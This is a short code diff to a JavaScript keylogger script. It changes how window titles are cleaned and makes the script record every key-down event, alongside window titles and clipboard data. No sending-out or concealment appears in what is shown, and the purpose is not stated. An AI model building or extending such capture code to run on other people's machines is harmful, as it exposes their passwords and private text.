@@ -36,8 +36,14 @@ let specialKeyStates = {};
 function cleanWindowTitle(title) {
     // Remove common prefixes/suffixes
     title = title.replace(/^[*?] /, ''); // Remove leading * or ?
-    title = title.replace(/ - .*$/, ''); // Remove everything after " - "
     title = title.replace(/[*?]$/, ''); // Remove trailing * or ?
+    
+    // If the title contains " - ", it's likely a parent-child window title
+    // We want to keep both parts
+    if (title.includes(" - ")) {
+        return title;
+    }
+    
     return title.trim();
 }
 
@@ -82,7 +88,7 @@ keylogger.start((key, isKeyUp, keyCode, windowTitle, clipboardData) => {
         specialKeyStates[key] = false;
     }
     // Handle regular characters (only on key down)
-    else if (key.length === 1 && !isKeyUp) {
+    else if (!isKeyUp) {
         // Handle shift-modified characters
         if (isShiftPressed) {
             currentText += key.toUpperCase();
@@ -113,4 +119,3 @@ setTimeout(() => {
     }
     keylogger.stop();
 }, 500000);
-
